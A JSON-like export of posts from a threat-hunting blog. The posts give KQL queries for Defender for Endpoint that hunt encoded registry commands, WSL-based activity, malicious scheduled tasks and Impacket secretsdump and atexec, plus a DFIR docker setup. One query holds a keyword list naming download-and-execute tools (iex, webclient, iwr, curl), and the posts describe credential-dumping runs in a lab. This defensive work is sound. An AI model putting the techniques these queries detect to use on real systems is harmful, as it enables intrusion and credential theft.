    "title": "Look into couple of suspicous registry activities",
    "body": "2025/02/08 - Look into couple of suspicous registry activitiesIt has been a long time since the last post. Since then you may see that I have upgrad… changed the look and feel of this blog. The reason for that is I got fed-up with Wordpress and hosting it and decided to see if it would be easy enough to migrate to Github Pages. It was as you may guess. Github pages seems to work great. I haven’t really had any ideas of what to blog about which is why it has been a bit. . quiet. I got an idea of looking into the registry and trying to find malicious powershell/whatever keys being created. So that is how I am going start this blog post, look into suspicious . . stuff. . being created in more general level to registry. I may dabble into runkeys but likely will leave that for another time. Encoded commandsEncoded commands in registry entries can be a sign of potential malicious activity. This post will explore some KQL queries that can help detect such activity. The first query I created is really simple. I am just trying to find encoded commands, nothing else. DeviceRegistryEvents| where Timestamp &gt; ago(30d)| where ActionType has_any ('RegistryValueSet','RegistryKeyCreated')| where isnotempty(RegistryValueData)| where RegistryValueData matches regex @'^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?$'| extend DecodedCommand = replace(@'\x00','', base64_decode_tostring(extract( [A-Za-z0-9+/]{50,}[=]{0,2} ,0 , RegistryValueData)))| where isnotempty(DecodedCommand)| project Timestamp, DeviceName, DecodedCommand, RegistryValueData, RegistryKey, RegistryValueName, RegistryValueType, PreviousRegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileNameThe reason for looking broadly into encoded commands is that this value could be read with powershell and then executed as encoded command. This could have other purposes but I remember a few incidents where I have seen encoded powershell commands being saved to registry. The problem with this query is that it is very broad. It is looking into all the registry additions and changes (well the ones which are recorded by MDE anyway) and thus it may not be runnable in this format in large environments.  The best way to limit would be to limit the time/devices we are looking at, for example only look into past day or few and potentially automate launching the query through the API. Running a command to create a matching key: This was not unfortunately logged with MDE. Seems this path is not logged at all. So I created the same key to a location where it should be logged: Seems like the second commandlet was not logged either.  I tried several other ways, I created a HKCU runkey and mimiced running powershell. exe with encoded command and it did not save it. I did they same for HKLM runkey and still nothing. I am a bit baffled to say the least, I can see the values in registry but it seems MDE is for some reason, not saving this telemetry. When I finally found way to get the data saved to registry the query worked. So this query is able to find base64 encoded strings but it is far from perfect. It also only matches if the full key value matches base64 encoded string, which is why I started creating version which matches if there are padded whitespace. Again of course this was a whole another adventure with my lacking regex skills and eded up being reaaaally complicated especially as the regex flavour used by KQL does not support lookbehinds or lookaheads, which makes it difficult to match if there is a whitespace before or after the padding. I ended up with the following query: DeviceRegistryEvents| where Timestamp &gt; ago(30d)| where ActionType has_any ('RegistryValueSet','RegistryKeyCreated')| where isnotempty(RegistryValueData)| where RegistryValueData matches regex @'\s+([A-Za-z0-9+/]{4,}(?:[A-Za-z0-9+/]{2}[=]{2}|[A-Za-z0-9+/]{3}=)?)\s+' or RegistryValueData matches regex @'^(?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{2}==|[A-Za-z0-9+\/]{3}=)?$'| extend ExtractedB64 = trim(   ,extract(@'(?:\s+)[A-Za-z0-9+\/=]+(?:\s+)',0,RegistryValueData))| extend DecodedCommand = replace(@'\x00','', base64_decode_tostring(RegistryValueData))| extend ExtractedDecodedCommand = base64_decode_tostring(ExtractedB64)| where isnotempty(DecodedCommand) or isnotempty(ExtractedDecodedCommand)| project Timestamp, DeviceName, DecodedCommand, ExtractedDecodedCommand, RegistryValueData, RegistryKey, RegistryValueName, RegistryValueType, PreviousRegistryValueData, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIPThe query provided above is used to extract and decode command interpreter paths present in registry values. However, it can produce false-positive matches due to the complexity of the regular expression used. Talk about ugly queries. . I could not figure out to fix that issue unfortunately and here is a screenshot showing some of the matches: Maybe the question is why to hunt this? The reason is that a threat actor can store these commands in registry and load them as part of a powershell command/script. I’ve seen this in multiple occasions and it may be useful to detect such activities. Also I think that I may understand why some of the telemetry was not captured by MDE. I think that it depends on the value name, at least partly. The reason why I think that to be the case is:  Creating a new value with name Publisher to key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\VeryBad including the base64 encoded string was recorded by MDE Creating a new value with the name Version to the same key was NOT capturedI think MDE might be filtering what telemetry is saved based on the value name. I don’t necessarily see this as a huge problem, goes to the same bucket I’ve discussed before; essentially Microsoft can’t save all the data. They need to have more granular approach to be able to support the vast amount of data generated by the tool. I would assume the logic is that the Evilness would likely be alerted based on other telemetry, which I think is fair. MDE is quite capable in detecting Evilness even if not capturing 100% of telemetry. Hunt for command interpreter present in registry values: The next one is a lot more simpler. I am looking for things like powershell. exe and cmd. exe being added to registry. Most likely these would be runkeys but there are more creative ways to utilize this. Here is an example of what I am looking for: This is a simple hunt that can be done with the following query: DeviceRegistryEvents// Filter out events initiated by OneDriveSetup. exe to reduce noise| where InitiatingProcessVersionInfoInternalFileName != @ OneDriveSetup. exe // Look at events from the last 30 days| where Timestamp &gt; ago(30d) // Consider only key set and key created actions| where ActionType has_any ('RegistryValueSet','RegistryKeyCreated')// Search for registry values containing 'powershell' or 'cmd'| where RegistryValueData has_any('powershell','cmd')// Project relevant fields for analysis| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP, InitiatingProcessParentFileNameI removed the results where the InitiatingProcessVersionInfoInternalFileName is pointing to onedrive setup. This causes a lot of FP and I didn’t want to whitelist the filename completely as some threat actors could use that filename too. This is really simple but could provide useful. It may be too noisy so more whitelisting may be required. Also, you can filter down to runkey locations given that those are most likely to contain these. Not a super elaborate query but should work. Hunt for keywords being set to registry: There are multiple ways how the bad guys could hide malicious code to registry. One way to look for this would be to do a keyword search on the items created. This is a bit lackluster with MDE given that it does not really save all the telemetry but as that is my weapon of choice in this blog lets get started. The query could be something as simple as this: DeviceRegistryEvents| where Timestamp &gt; ago(30d)| where ActionType has_any ('RegistryValueSet','RegistryKeyCreated')| where RegistryValueData has_any('xor','new-item','invoke-expression','iex','sleep','invoke-','System. Net. HttpWebRequest','webclient','iwr','curl') // Look for common obfuscation techniques or commands used in malicious scripts| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessRemoteSessionDeviceName, InitiatingProcessRemoteSessionIP, InitiatingProcessParentFileName // Project relevant fields for analysisThis query will look for any registry value set or key created in the last 30 days that contains any of the keywords listed. The keywords are common in PowerShell scripts used for malicious purposes. The results will include the timestamp, device name, registry key, registry value name, registry value data, initiating process account name, initiating process file name, initiating process command line, initiating process remote session device name, initiating process remote session IP, and initiating process parent file name. This can help in identifying potential malicious activities, without having excessive information present. Here is a hit from the query: To conclude this blog post I want to thank everyone for reading and I hope this information is helpful. A little insight to hunting with the registry can go a long way in identifying malicious activities Queries in GUI: I also noticed that the queries I’ve been submitting to the MS repo have been now added to the hunting GUI which is great to see! Here is a picture of one of the queries. Love the easy accessibility.  Microsoft Repo PR: https://github. com/Azure/Azure-Sentinel/pull/11781 "
    }, {
    "id": 17,
    "url": "https://threathunt.blog/wsl/",
    "title": "Hunting for Windows Subsystem for Linux based attacks",
    "body": "2024/11/10 - Hunting for WSL based BadnessWindows Subsystem for Linux has been a thing for a long while and has been extended to version 2 already years ago. It is an amazing feature which allows you to, well, run lightweight linux on top of Windows OS. It offers the linux capabilities which many of us may be missing when using Windows and is very neatly integrated to the operating system. This is a great little feature for sysadmins, cyber security experts and the likes whom enjoy using linux but may be stuck with using Windows for whatever reason. However, I was wondering if it is possible to detect usage of potentially malicious techniques through WSL when utilizing Defender for Endpoint. I installed WSL to my lab and ran couple of commands:  Ran bloodhound to dump information from the domain.  I ran an NMAP scan to the local network. ResultsI used the bloodhound. py package to run the bloodhound tool from the WSL. It ran successfully, generating the . JSON files with the information from the Active Directory. If I would run Sharphound on the Windows host with MDE agent I would get a ton of alerts, the file creations and the LDAP queries towards the Domain Controllers. Now that I ran it from WSL I got nothing of those. File creations, where art thee? Same with the ldap queries which are normally saved to the DeviceEvents table. They were nowhere to be seen. I think this was quite expected results given the way how the EDR works though, so I wasn’t very surprised. So how about nmap? Well I was half expecting that because of the zeek integration this would potentially be picked up on the network events table, however it seems that there is nothing relating to this activity. Not ideal then, it seems that pretty much nothing is observed when things are being done within the WSL. I made couple of web requests with wget to test if the http connections are saved. Wget results are shown! These are seen so it is not all in vain. This information could potentially be used to hunt for C2 connections or similar. However it will be very hard to use this information. I think that if it is encrypted like almost all the malicious traffic is now there isn’t anything saved. In the end this seems to be very hard topic if things are done interactively.  It is whole another matter if the threat actor is running commands as part of the cmdline: Running commands as part of cmdline This leaves the cmdline exposed so that it can be analyzed as we can see from the following picture: Commandlines may expose Evilness. Given that this is relatively simple hunting method I don’t really bother releasing a query for this. You could just look for rare commandlines and be done with it. However, it was a good to learn that if an attacker is running WSL in interactive mode there is little to none evidence left to Defender for Endpoint to hunt for badness; linux based forensic approach would likely be needed if there is an assumption that a threat actor has been utilising WSL. Microsoft Defender for Endpoint plugin for WSL: Microsoft has released a plugin to tackle this issue. This has been documented here. I installed the plugin per instructions. After installing this we can see additional endpoint in the asset inventory: WSL endpoint in the asset inventory. Most of the events observed on the WSL endpoint are process events: Event counts from the WSL endpoint. For example, files created by BloodHound are not part of the telemetry. However, the network connections are. The telemetry provided from the WSL host is less rich than from the native agent, however it is still bringing visibility to where there was no visibility before. We could use a query like the following to list actions available from the processes launched in interactive WSL session: let wsl_endpoints = DeviceInfo| where OSPlatform ==  Linux  and isempty(HostDeviceId) != true| distinct DeviceId;union DeviceEvents, DeviceFileEvents, DeviceImageLoadEvents, DeviceLogonEvents, DeviceNetworkEvents, DeviceProcessEvents, DeviceRegistryEvents| where DeviceId in (wsl_endpoints)| where isnotempty(InitiatingProcessFileName)| sort by Timestamp desc| summarize Actions = make_set(ActionType), FileNames = make_set(FileName), RemoteIPs = make_set(RemoteIP) by InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, DeviceName The query uses the example from the Microsoft documentation to pinpoint WSL endpoints and then lists all actions from these endpoints. For example, successful BloodHound execution shows like this: Successful BloodHound execution. When running nmap scan on the local network no network connections were logged to the WSL endpoint though. The process start for NMAP was recorded but nothing else. What this means is that I’d say the best way to hunt within the WSL host is by commandlines. This can be done with several means like targeting directly certain interesting commands or running statistical analysis (like long-tail analysis) to filter out the noise. It is not the most elaborate way of threat hunting (and it has the same issues as process cmdline based hunting does otherwise) but it is still way better than having no visibility to WSL. Without the WSL addon for Defender for Endpoint the visibility is zero if commands are being ran interactively within the WSL endpoint. The addon brings visibility to the endpoint, it may not be as good as native Windows client but it is still much better than having nothing. It seems though there are no alerts brought up from the WSL endpoint. If you have WSL enabled within your environment I’d really suggest deploying the WSL addon to the devices and then run some proactive threat hunting to find potential threat actors utilising the feature for malicious activity. "
    }, {
    "id": 18,
    "url": "https://threathunt.blog/hunting-for-malicious-scheduled-tasks/",
    "title": "Hunting for malicious scheduled tasks",
    "body": "2024/10/06 - Why? Executing code &amp; persistence through scheduled tasks is one of the most common techniques used by the threat actors to persist on a device. I also have noted that quite often the threat hunting is based on something like schtasks being used to create those tasks. This is fine as that is likely the most common way to create the task, but my methodology to threat hunting is to hunt for the underlining operations which the command executes. In this example, the way I like to hunt is by looking into the registry entries which needs to be created for a scheduled task. As some may remember, I wrote a blog post about hidden scheduled tasks some time ago which touches the same subject. However, it is far from complete so I am going to have another look. Also, there are different angles which to hunt for. For example, are you hunting for new task creation? What if the retention time has gone already, should you hunt for execution of scheduled task instead? So let’s get started by creating a scheduled task: Creating the task. I created a task which launches notepad, as the picture shows. Don’t mind my little brain fart with the naming :). Hunting for creationLet’s start with the creation of the task. The registry key is not created by the schtasks. exe process itself, rather it is created by svchost: svchost. exe -k netsvcs -p -s Schedule. Is this always the case independent of how the task is created? Very hard to say. Nevertheless, it seems that the actual command which is launched as a scheduled task is not saved in any registry action at least with MDE - I seem to recollect that I’ve been able to see the actual launched command too. I had a look at the data and noticed that the event ScheduledTaskCreated in DeviceEvents table does have this information. I also seem to recollect that this wasn’t the case always.   I created a similar task with powershell to check if this is logged in similar fashion. Creating scheduled task with Powershell. It is also saved as a similar entry so I will work with this ActionType. I created a simple query to extract information from the scheduled tasks and then calculate how many times a program &amp; arguments is observed in the environment and show results where the combination has been shown less than 5 times. let ScheduledTasks = materialize (DeviceEvents| where ActionType contains  ScheduledTaskCreated | extend TaskName = extractjson( $. TaskName , AdditionalFields, typeof(string))| extend TaskContent = extractjson( $. TaskContent , AdditionalFields, typeof(string))| extend SubjectUserName = extractjson( $. SubjectUserName , AdditionalFields, typeof(string))| extend Triggers = extractjson( $. Triggers , TaskContent, typeof(string))| extend Actions = extractjson( $. Actions , TaskContent, typeof(string))| extend Exec = extractjson( $. Exec , Actions, typeof(string))| extend Command = extractjson( $. Command , Exec, typeof(string))| extend Arguments = extractjson( $. Arguments , Exec, typeof(string))| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessAccountName, TaskName, Command, Arguments, SubjectUserName, Triggers);ScheduledTasks| summarize count() by Command, Arguments| where count_ &lt; 3| join ScheduledTasks on Command, Arguments| project-away Command1, Arguments1BTW I am sure there is much better way of extracting the nested JSON. I tried to look for a better way for full 2 minutes but all the answers were not either working to this level of nesting or didn’t really do it in much refined manner. The query works fine though - there of course is a bit of a chance that it provides way too much noise in your environment to be useful. I would suggest though not to filter based on task name unless you are quite sure what you are doing, given that the malicious code is often hidden under task names mimicing real sheculed tasks (hint. onedrive. . ). Hunting for execution: The approach for this is to see which process launches the scheduled tasks. As to be expected, it is svchost. exe. The commandline seems to be svchost. exe -k netsvcs -p -s Schedule, same for both of the tasks created here. So this makes it really easy to hunt for all processes which has been started by this specific parent. The start is easy but as you may know there is ton of different applications being started as scheduled task in Windows. How to know what is malicious? This is quite challenging to filter out but I decided to start by including the usual suspects: cmd. exe, powershell. exe, rundll32. exe, regsvr32. exe and all the binaries not started from C:\Windows\System32\. You probably need to filter to your own needs. The first query looks for execution of a combination of a file name, command line and path for less than 10 times. let RunningScheduledTasks = materialize(DeviceProcessEvents| where InitiatingProcessFileName == @ svchost. exe | where InitiatingProcessCommandLine == @ svchost. exe -k netsvcs -p -s Schedule | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, ProcessId, FolderPath| where FileName != @ MpCmdRun. exe | where FolderPath !startswith @ C:\Windows\System32\  or FileName =~  cmd. exe  or FileName =~  powershell. exe  or FileName =~  rundll32. exe  or FileName =~  regsvr32. exe );RunningScheduledTasks| summarize count() by FileName, ProcessCommandLine, FolderPath| where count_ &lt; 10| join RunningScheduledTasks on FileName, ProcessCommandLine, FolderPath| project Timestamp, DeviceName, FileName, ProcessCommandLine, FolderPath, AccountName, count_The second one is a bit more. . longer. I tried to look for a way to save several distinct values of a query to be used as filter within the next table. It wasn’t as simple as a thought but I got it done in the end. The idea for this is to look what are the processes actually doing that we are interested in - beware though it can be resource heavy and if the spawned processes do not do anything it will produce no results. Beware, I have not really used this method before. I see no reason why it wouldn’t bring results but I have not tested it extensively. In the end this query makes sets of data to produce findings on a single line. let RunningScheduledTasks = materialize(DeviceProcessEvents| where InitiatingProcessFileName == @ svchost. exe | where InitiatingProcessCommandLine == @ svchost. exe -k netsvcs -p -s Schedule | project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, ProcessId, FolderPath| where FileName != @ MpCmdRun. exe | where FolderPath !startswith @ C:\Windows\System32\  or FileName =~  cmd. exe  or FileName =~  powershell. exe  or FileName =~  rundll32. exe  or FileName =~  regsvr32. exe | summarize count() by FileName, ProcessCommandLine, FolderPath| where count_ &lt; 3| summarize  Names = make_set(FileName),  CommandLines = make_set(ProcessCommandLine),  FolderPaths = make_set(FolderPath));let Names = RunningScheduledTasks| project Names| mv-expand extended = Names| project asstring = tostring(extended)| distinct tolower(asstring);let CommandLines = RunningScheduledTasks| project CommandLines| mv-expand extended = CommandLines| project asstring = tostring(extended)| distinct tolower(asstring);let FolderPaths = RunningScheduledTasks| project FolderPaths| mv-expand extended = FolderPaths| project asstring = tostring(extended)| distinct tolower(asstring);union DeviceProcessEvents,DeviceNetworkEvents,DeviceFileEvents,DeviceRegistryEvents,DeviceLogonEvents,DeviceImageLoadEvents,DeviceEvents| where tolower(InitiatingProcessFileName) in (Names)and tolower(InitiatingProcessCommandLine) in (CommandLines)and tolower(InitiatingProcessFolderPath) in (FolderPaths)| sort by Timestamp desc| summarize Actions = make_set(ActionType), FileNames = make_set(FileName), RemoteIPs = make_set(RemoteIP) by InitiatingProcessFileName, InitiatingProcessId, InitiatingProcessCommandLine, InitiatingProcessCreationTime, DeviceNameAnd that is it for now! Hopefully these brings value to you. MS pull request. My repo. Video walkthrough. "
    }, {
    "id": 19,
    "url": "https://threathunt.blog/the-dfir-thing-reg-parsing-1/",
    "title": "The DFIR thing reg parsing #1",
    "body": "2024/08/29 - This blog post was lost in migration from Wordpress to Github Pages. :( I am using Regipy Python module to parse the registry files with the help of additional Python script. However, I don’t intend to rewrite the full blog post so please watch the youtube video below if you need to have more information how the parsing works currently. Links: GitHub repository Youtube video series of the DFIR thing (part 1) "
    }, {
    "id": 20,
    "url": "https://threathunt.blog/the-dfir-thing/",
    "title": "The DFIR thing",
    "body": "2024/07/27 - The DFIR. . what?For the last couple of years I have tinkered around a docker-compose configuration for launching DFIR investigation system. The original one was created with four components:  ELK - ingesting all the data with all the visualisations PLASO - parse all the Windows evidence Chainsaw - parse evtx logs Hayabusa - parse evtx logsThis was a good start and I used it especially with different CTF’s and such. However it did get a bit heavy so I started to revamp it, reusing the old components partly. The new version will have only partial functions implemented for now, mainly the Chainsaw and Hayabusa parts of the old set but they have been polished a bit.  Current versionThe current version is a combination of three different docker-compose files which are launching a set of different containers. The following diagram represents the three files: The docker compose containers. Docker-compose. yml: This is the main configuration which launches the ELK stack, Filebeat and also a container known as create-incides. The create-indices container is creating the indices for Chainsaw and Hayabusa. The reason for running the container is that if it is not done the Hayabusa ingestion will fail. Some of the fields on Hayabusa output has wrong data type so if the ELK is automatically setting the contents it is likely that those fields will be set to numerical values and some of the other content can’t be ingested because of wrong data type. The creation of the indices makers sure that those fields are set as string data type. Also it adds limitation of unique fields to 2000, which is also required as I am using the super-verbose option on Hayabusa which creates a massive amounts of fields. Beware! Although this fixes most of the ingestion issues of Hayabusa it is still not able to ingest 100% of events; the details field should be an object but on some events it contains concrete data. Those fields will be sent to Dead Letter Queue as they can’t be parsed. Docker-compose-dashboards. yml: This file is fairly simple. It is importing the Kibana saved objects to the ELK stack so that the visualizations are available. It needs to be run separately at your own will. Docker-compose-scans. yml: This one is launching the Chainsaw and Hayabusa containers. The containers target the case_data subfolder - all the EVTX files which you would like to parse should be placed to this folder before running the container. Using the DFIR thingIt should be relatively easy to use for anyone who has support for docker. Follow these easy steps:  Clone the Git repository Place your EVTX files to the case_data folder. Chainsaw and Hayabusa are able to find them from subfolders so the structure is not very important.  Start the ELK stack (in  root of the cloned repo): docker-compose up -d Wait for the stack to start. Browse to http://localhost:5601 to see that the ELK stack is up and responding. There should be two indices now.  Import dashboards with the following command (in  root of the cloned repo): docker-compose -f docker-compose-dashboards. yml up You should now be able to see the dashboards.  I suggest to remove the container: docker-compose -f docker-compose-dashboards. yml down To parse your evtx logs from the case_data folder run the following command: docker-compose -f docker-compose-scans. yml up After Chainsaw and Hayabusa containers are successfully launched the data is automatically picked up by Logstash and sent to elasticsearch. The Kibana dashboards should be working.  Remove the scans container: docker-compose -f docker-compose-scans. yml down Start forensicating using Kibana. Steps to run the DFIR thing. DashboardsThe dashboards are VERY straight forward. The dashboards on Kibana. The overview gives you an overview of the data. At the bottom of the page (actually bottom of all the dashboards) you can find a timeline of the data where you can see all the events which hit the filters.    Overview: All the events, no filters. The timeline at the bottom of the dashboards only has high level information Powershell: Powershell related events.  User activity: Mostly logon events, but also has things like group additions Persistence: Persistence related events.  Processes: Process launches.  REST: All the events which do not hit on the previous filters. The Chainsaw is quite similar but it is more limited. Honestly, the Hayabusa brings in much more details and data so I think it is a better tool for this particular approach. I might remove Chainsaw completely in the future, the reason why I have both is that I wanted to learn how this approach works, create the containers, and all that. So it was mostly for my personal learning experience. File structureThe file structure is explained below.  case_data/ - contains all the evtx files to be parsed. Empty when a clean env is cloned.  chainsaw/ - contains the chainsaw docker image.  config/ - contains the config files for ELK stack.  dashboards/ - contains the dashboards to be imported to Kibana.  elasticsearch/ - contains the elasticsearch persistent data.  filebeat/ - contains ingestion for couple of web servers by filebeat. Not really used currently but you can use it to ingest web server logs. No dashboards or anything.  hayabusa/  - contains the Hayabusa docker image.  logstash/ - contains the logstash files, the configurations, ingestion folders for the data, persistent data.  docker-compose-dashboards. yml - importing the dashboards.  docker-compose-scans. yml - running Chainsaw and Hayabusa.  docker-compose. yml - running ELK.  createindices. sh  - used by the ELK configuration for creating the indices over the API.  import. sh - used to import the dashboards over the API. Final wordsThis is fairly straightforward way of ingesting EVTX files and quite a large amount of them. Investigating should be quite easy with the help of the dashboards and it may provide to be useful especially when starting an investigation. It is far from complete especially as it currently support only EVTX files. Something like SOF-ELK is much more complete solution for investigating, however I myself MUCH prefer containers which is why I started to build this out. What it is for you? I guess it can be used out of the box to get started but it could also be used to build upon on your own needs. The basic idea is functioning really well imo but it is just missing the configurations for other file types than EVTX. I do not intend to make this a huge project which I would constantly work on but wanted to release this so that you may have a look and determine if you enjoy it.   It is one of my hobby projects which I hope to update in the future though. I do plan on extending this. Next steps will likely include support for Loki scan and or Registry parsing (likely with Regipy). Links: GitHub repository Youtube video series of the DFIR thing (part 1) "
    }, {
    "id": 21,
    "url": "https://threathunt.blog/impacket-part-3/",
    "title": "Impacket - Part 3",
    "body": "2024/06/01 - Continuing with ImpacketI will do one more post on the series and that will be it. The first post was mostly about the different ways that Impacket can launch semi-interactive shells, the second one was revolving around using WMI based techniques. On the third one I will go through some of the modules which interest me and it may be a bit random.  Impacket-secretsdump: Starting with the secretsdump which is performing a various of different techniques to dump secrets from the remote machine. It would be some sort of miracle if it wouldn’t paint the Defender alert console red with alerts. No miracles there, we have a cool alert of the activity: Defender alerting about dumping the credentials. As the picture shows the Defender also took some actions which I am fairly interested in. So I’ll hop to the action center to see what did it do to disrupt the attack to find out that there actually wasn’t anything else done than user containment, similar which was done on the first part of the Impacket series. So nothing new but maybe there would have been more activity if I had the full XDR stack deployed instead of a single component. Anyway, here is a cool pick of the activity taken. Defender containing a user account. There are a lot of things happening here, the RemoteRegistry service is disabled on the target system so the Secretsdump feature first enables the service and then starts it, after which it proceeds to dump the secrets from the target machine. There are quite clear indicators left on the timeline of the activity, actually so clear indicators like “svchost. exe saved LSA Secrets to mrsdDEMR. tmp” that I am wondering if these can be found from the advanced hunt. Secretsdump activity shown on timeline. Unfortunately for some reason the advanced hunting page is not working for me at the time of looking the alerts. It is only returning a white page so it is a bit hard to determine what I can see in the advanced hunt. I would assume that it will not be as clear as on the timeline though. One interesting question is though, is there anything to hunt here anyway? It is relatively noisy already - maybe the remote registry modifications could be something to hunt for as it may be something that is rare within the environments. Sounds a bit boring to me though. So I waited a bit and the advanced hunting does not continue to work. However, it did work with secondary account so I was a bit baffled. After debugging a bit I noticed that it will always break if I click the “hunt for related events button” on Device Timeline. For some reason, after clicking that button the advanced hunting is loading only a white page so there potentially is a bit of a bug there currently. It will apparently try to load the query behind the hunt for related events button but can’t and returns a white page. Clicking the hunt for related events breaks the advanced hunting feature for me. Boo. I got this fixed by reloading the page for kazillion times and trying to close the query page which is trying to load the problematic query. I can click one or two times before the screen is going full white and after doing this for a bit it will work once more. Nevertheless after it works I was able to see that the interesting data is available in advanced hunting too, it is in the DeviceEvents table under the OtherAlertRelatedActivity ActionType. Cool information stored with the alert. I don’t necessarily want to create a query around this as it does not make much sense to me to hunt based on alerted events. I am not saying it would not make any sense, sometimes it can be a good idea.   There is an interesting NamedPipe being opened from the source device with a pipe name pointing to winreg. This could be quite rare: DeviceEvents| where ActionType ==  NamedPipeEvent | where isnotempty(RemoteIP)| where AdditionalFields contains  winreg | project DeviceName, Timestamp, RemoteIP, PipeName = extractjson( $. PipeName , AdditionalFields, typeof(string)), RemoteClientsAccess = extractjson( $. RemoteClientsAccess , AdditionalFields, typeof(string)), ShareName = extractjson( $. ShareName , AdditionalFields, typeof(string)), AdditionalFieldsThis as of itself is probably not enough though it could provide to be so rare that no additions are actually needed. I did a join to the registry event where the remote registry is being enabled on the device. I am a little unsure if this makes any difference though. DeviceEvents| where ActionType ==  NamedPipeEvent | where isnotempty(RemoteIP)| where AdditionalFields contains  winreg | project DeviceName, Timestamp, RemoteIP, PipeName = extractjson( $. PipeName , AdditionalFields, typeof(string)), RemoteClientsAccess = extractjson( $. RemoteClientsAccess , AdditionalFields, typeof(string)), ShareName = extractjson( $. ShareName , AdditionalFields, typeof(string)), AdditionalFields| join (DeviceRegistryEvents| where RegistryKey == @'HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\RemoteRegistry'| where RegistryValueName == @ Start | where RegistryValueData == @ 3 | project DeviceName, RegEditTimestamp = Timestamp, ActionType, RegistryKey, RegistryValueData, RegistryValueName, RegistryValueType) on DeviceName| where RegEditTimestamp &lt; Timestamp| project-away DeviceName1The query is looking for remote registry being set to manual, as at least on the device which I was running the tests on had it disabled when starting. It is not really touching the actual dumping activity. Hunting for actual dumping is actually kinda hard as the information is not available in elsewhere than the OtherAlertRelatedActivity action. The file creations by svchost. exe when the data is dumped to a file are not present in the DeviceFileEvents table. The following is one of the files created: \Device\HarddiskVolume3\Windows\Temp\mrsbDEMR. tmp - maybe this is left out from the telemetry to reduce noise. Nevertheless, there isn’t a good angle unless using the OtherAlertRelatedActivity which I presume is not available if there is no alert raised. AtExec: There are very interesting  scripts in Impacket like GetNPUsers and GetUserSPNs which would be interesting to test out, however they are targeting the Active Directory domain and I do not have visibility with Defender for Identity to my Domain Controllers so it makes no sense to have a look at these at this time. Many of the others are quite limited to a certain specific situation which makes them less interesting to me to look through, which is why I decided to, as a final part to this series, have a look at atexec. This was immediately noticed by the Defender and alerted about. The defender also reported this as Impacket. Alerts of AtExec usage. This is actually quite interesting! The scheduled task is created with help of a named pipe called \Device\NamedPipe\atsvc.  A registry key is created: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\DfJZjSFJ where the last, bolded, part is the name of the created service. Interestingly though the actual command launched as a service is not recorded anywhere in the telemetry. However, with the information we have here we can make a join to a child process of svchost. exe to correlate what the actual task does. This may not be 100% accurate though - beware.   I created a query which looks for the named pipes first with name atsvc. Then it is joined to registry events, filtering to events which happen close to the named pipe event. Finally it is joined to a process started by the same svchost. exe process which creates the registry key, picking the processes started 2 minutes after the registry key has been created. let lookuptime = 30d;DeviceEvents| where Timestamp &gt;ago(lookuptime)| where ActionType == 'NamedPipeEvent' | where AdditionalFields contains  atsvc | project DeviceName, Timestamp, DeviceId, RemoteIP, PipeName = extractjson( $. PipeName , AdditionalFields, typeof(string)), RemoteClientsAccess = extractjson( $. RemoteClientsAccess , AdditionalFields, typeof(string)), ShareName = extractjson( $. ShareName , AdditionalFields, typeof(string))| join (DeviceRegistryEvents| where Timestamp &gt;ago(lookuptime)| where ActionType == 'RegistryKeyCreated' | where RegistryKey contains @ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\ | project RegTimestamp = Timestamp, DeviceName, DeviceId, RegistryKey, RegistryValueData, RegistryValueName, RegistryValueType, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime) on DeviceName, DeviceId| where RegTimestamp between ((Timestamp - 2m) . . (Timestamp + 2m))| join (DeviceProcessEvents| where Timestamp &gt;ago(lookuptime)| where InitiatingProcessFileName =~  svchost. exe | where InitiatingProcessCommandLine contains  Schedule | project DeviceId, DeviceName, FileName, ProcessCommandLine, ProcessId, ProcessStartTimestamp = Timestamp, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime) on DeviceName, DeviceId, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime| where ProcessStartTimestamp between ( Timestamp . . (Timestamp +2m))| project DeviceName, Timestamp, StartedProcess = FileName, StartedProcessCommandLine = ProcessCommandLine, StartedProcessId = ProcessId, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessId, InitiatingProcessCreationTime, RegistryKey, RemoteIP, PipeNameIt works great in my testing environment: Results from the query. And that is it for Impacket. I might revisit it if I decide to get the MDI license to my testing environment, there are cool modules which are targeted more against AD. Anyway, have a great day and happy hunting! I decided to leave the first query out from MS repo. I don’t think it creates enough value. The second one is better so: AtExec My repo containing both queries "
    }, {
    "id": 22,
    "url": "https://threathunt.blog/impacket-part-2/",
    "title": "Impacket - Part 2",
